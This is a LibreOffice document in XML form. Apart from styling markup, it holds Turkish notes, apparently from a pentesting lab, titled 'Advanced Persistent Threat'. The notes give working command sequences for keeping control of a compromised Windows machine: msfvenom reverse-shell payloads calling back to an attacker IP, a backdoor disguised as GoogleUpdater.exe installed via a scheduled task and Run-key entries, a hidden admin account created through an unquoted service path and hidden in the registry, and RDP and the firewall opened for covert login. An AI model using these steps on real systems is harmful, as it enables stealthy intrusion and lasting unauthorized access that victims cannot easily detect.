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Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:paragraph-rsid="001a4133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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00409163" officeooo:paragraph-rsid="003ee919" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#224b12" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="0048cd34" officeooo:paragraph-rsid="0048cd34" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00531d31" officeooo:paragraph-rsid="00531d31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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00409163" officeooo:paragraph-rsid="003ee919" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0054aa85" officeooo:paragraph-rsid="0054aa85" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0056ff0b" officeooo:paragraph-rsid="0056ff0b" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0056ff0b" officeooo:paragraph-rsid="00579ba0" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00579ba0" officeooo:paragraph-rsid="00579ba0" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00594b33" officeooo:paragraph-rsid="00594b33" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005a889c" officeooo:paragraph-rsid="005a889c" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005a889c" officeooo:paragraph-rsid="005bc3e3" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005bc3e3" officeooo:paragraph-rsid="005bc3e3" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005be0f4" officeooo:paragraph-rsid="005be0f4" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0054aa85" officeooo:paragraph-rsid="0054aa85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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00550d5f" officeooo:paragraph-rsid="00550d5f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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00594b33" officeooo:paragraph-rsid="00594b33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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="005bc3e3" officeooo:paragraph-rsid="005bc3e3" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00531d31"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="005a889c"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="005bc3e3"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="005be0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9</text:span>. <text:span text:style-name="T1">ADVANCED PERSİSTENT THREAT</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">Manuel Payloadlar Oluşturma <text:s/>(Backdoor)</text:p>
      <text:p text:style-name="P6">python -m http.server</text:p>
      <text:p text:style-name="P6">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; rev-shell.exe </text:p>
      <text:p text:style-name="P6">karşıda manuel çalıştırdık</text:p>
      <text:p text:style-name="P6">metasploitten multi handler ı bulup ayarlıyoruz <text:s/></text:p>
      <text:p text:style-name="P6">set lhost 10.10.10.80</text:p>
      <text:p text:style-name="P6">set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P6">run</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P15">Backdoor u Sistem Açılışına Yerleştirmek</text:p>
      <text:p text:style-name="P6">python -m http.server</text:p>
      <text:p text:style-name="P2">msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; rev-cmd-shell.exe</text:p>
      <text:p text:style-name="P2">cd "c:\programdata\microsoft\windows\start menu\programs\startup"</text:p>
      <text:p text:style-name="P2">upload /root/Desktop/rev-cmd-shell.exe</text:p>
      <text:p text:style-name="P6">metasploitten multi handler ı bulup ayarlıyoruz <text:s/></text:p>
      <text:p text:style-name="P6">set lhost 10.10.10.80</text:p>
      <text:p text:style-name="P6">set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P6">run</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P15">Backdoor u Task Manager a Yerleştirmek</text:p>
      <text:p text:style-name="P6">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; GoogleUpdater.exe</text:p>
      <text:p text:style-name="P6">system olarak oturum açtık.</text:p>
      <text:p text:style-name="P6">Backdoor u koyacağımız uygun yeri bulduk. Ismimiz de GoogleUpdate.exe</text:p>
      <text:p text:style-name="P6">cd "<text:a xlink:type="simple" xlink:href="../../../../../c:/perflogs" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c:\perflogs</text:a>"</text:p>
      <text:p text:style-name="P6">upload /root/Desktop/GoogleUpdater.exe</text:p>
      <text:p text:style-name="P6">shell</text:p>
      <text:p text:style-name="P6">schtasks /create /tn GoogleUpdater /tr "C:\PerfLogs\GoogleUpdater.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop" /sc onstart /ru System</text:p>
      <text:p text:style-name="P6">açılışta sistemdeyiz..</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P16">Unquoted Service Path ile Kullanıcı Ekleme</text:p>
      <text:p text:style-name="P7">normalde pathlerde program files gibi arasında boşluk olan pathler “” ile yazılır ama yazılmadığı takdirde programı okur ve bir sonraki exeyi bulana kadar devam eder. </text:p>
      <text:p text:style-name="P7">Bu güvenlik açığından, <text:a xlink:type="simple" xlink:href="../../../../../c:/Program.exe" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c:\Program.exe</text:a> yaratarak faydalanabiliriz.</text:p>
      <text:p text:style-name="P7">msfvenom -p windows/adduser user=admin12 pass=Password-123 -f exe &gt; program.exe</text:p>
      <text:p text:style-name="P9">Girdiğimiz sessiondan..</text:p>
      <text:p text:style-name="P8">run post/windows/gather/enum_services</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">OpenSSHd <text:s text:c="3"/>.\sshd_server <text:s text:c="3"/>Auto <text:s text:c="2"/>C:\Program Files\OpenSSH\bin\cygrunsrv.exe</text:p>
      <text:p text:style-name="P9">yeni kullanıcı oluşturacağız <text:s/>(.\sshd_server)</text:p>
      <text:p text:style-name="P9">c nin altında yaratmak için root olacağız.</text:p>
      <text:p text:style-name="P9">cd c:\\</text:p>
      <text:p text:style-name="P9">upload /root/Desktop/program.exe</text:p>
      <text:p text:style-name="P10">yeni kullanıcı ve şifre hazır.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P17"><text:soft-page-break/>Registry ile Kullanıcı Girişi Gizle</text:p>
      <text:p text:style-name="P11">root olarak açtık</text:p>
      <text:p text:style-name="P11">karşıda run üzerinden regedit yazıp girdik.</text:p>
      <text:p text:style-name="P11">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft<text:span text:style-name="T3">\</text:span>Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</text:p>
      <text:p text:style-name="P11">burada logon da gözükmeyen ama varolan userları görüyoruz.</text:p>
      <text:p text:style-name="P11">Kendimizi ekleyeceğiz.</text:p>
      <text:p text:style-name="P11">Shellden <text:s/>c:\Windows\system32 <text:s/>gideceğiz.</text:p>
      <text:p text:style-name="P11">reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon\specialacco0 -reg:64</text:p>
      <text:p text:style-name="P11">işlem tamam.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P18">Registry ile Açılışa Exe Yerleştirme</text:p>
      <text:p text:style-name="P12">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft<text:span text:style-name="T3">\Windows\CurrentVersion\Run altında çalışan ama startup da gözükmeyen exeler var. kendimizi buraya ekleyeceğiz.</text:span></text:p>
      <text:p text:style-name="P13">Meterpreter ı açıyoruz. </text:p>
      <text:p text:style-name="P13">Shelle geçip <text:s/><text:span text:style-name="T2">c:\Windows\system32 <text:s/>gideceğiz.</text:span></text:p>
      <text:p text:style-name="P12">reg add "HKLM\software\microsoft\windows\currentversion\run" -v GoogleUpdate -d "C:\perflogs\googleupdater.exe" -t reg_sz -reg:64</text:p>
      <text:p text:style-name="P13">açılışa yerleştik..</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P18">Registry ile Remote Desktop ı Aktif etme</text:p>
      <text:p text:style-name="P13">HKLM\system\currentcontrolset\control\terminal server </text:p>
      <text:p text:style-name="P13">buradaki <text:s/>fDenyTSConnections <text:s/>1 ise harici bağlanmayı deny eder.</text:p>
      <text:p text:style-name="P13">Bunu 1 yapacağız.</text:p>
      <text:p text:style-name="P13">Shelle geçiyoruz</text:p>
      <text:p text:style-name="P13">reg add "HKLM\system\currentcontrolset\control\terminal server" -v fDenyTSConnections -t reg_dword -d 0 -reg:64</text:p>
      <text:p text:style-name="P13">0 a ayarlıyoruz</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13">netsh advfirewall firewall set rule group="remote desktop" new enable=yes</text:p>
      <text:p text:style-name="P13">firewall da rule ekleyrek kendimize erişim için izin veriyoruz.</text:p>
      <text:p text:style-name="P13">rdesktop -k tr 10.10.10.11 -u admin12</text:p>
      <text:p text:style-name="P13">buradan, kendi oluşturduğumuz ve gizli olan user ile giriş yapıyoruz..</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P18">Metasploit ile Remote Desktop ı Aktif Etme</text:p>
      <text:p text:style-name="P13">shellde</text:p>
      <text:p text:style-name="P13">run post/windows/manage/enable_rdp <text:s/>(kapalıysa rdp ekliyoruz)</text:p>
      <text:p text:style-name="P13">run post/windows/manage/add_user USERNAME=admin5 PASS=12345 <text:s/>(admin user hazır)</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P18">Metasploit ile Açılışa Exe Yerleştirme</text:p>
      <text:p text:style-name="P13">payloadları hep x64 a ayarladığımzdan emin olalım.</text:p>
      <text:p text:style-name="P13">Root olarak girelim.</text:p>
      <text:p text:style-name="P13">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; googlesync.exe</text:p>
      <text:p text:style-name="P13">gerekli exe yarattık.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13">windows/manage/persistence_exe</text:p>
      <text:p text:style-name="P13">buna girip ayarlıyoruz</text:p>
      <text:p text:style-name="P13">set rexename googlesync.exe</text:p>
      <text:p text:style-name="P13">set rexepath /root/Desktop/googlesync.exe</text:p>
      <text:p text:style-name="P13">set session 5 <text:s text:c="10"/><text:span text:style-name="T4">(SYSTEM olan session seçiyoruz.)</text:span></text:p>
      <text:p text:style-name="P13">set startup SYSTEM <text:s text:c="5"/><text:span text:style-name="T4">(SYSTEM olarak açmaya çalışıyoruz.)</text:span></text:p>
      <text:p text:style-name="P14">run..</text:p>
      <text:p text:style-name="P14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/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P9"/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5:34:57.473771278</meta:creation-date>
    <dc:date>2022-09-05T14:11:48.500886412</dc:date>
    <meta:editing-duration>PT20H20M36S</meta:editing-duration>
    <meta:editing-cycles>51</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="81" meta:word-count="412" meta:character-count="3842" meta:non-whitespace-character-count="3470"/>
  </office:meta>
</office:document-meta>
</file>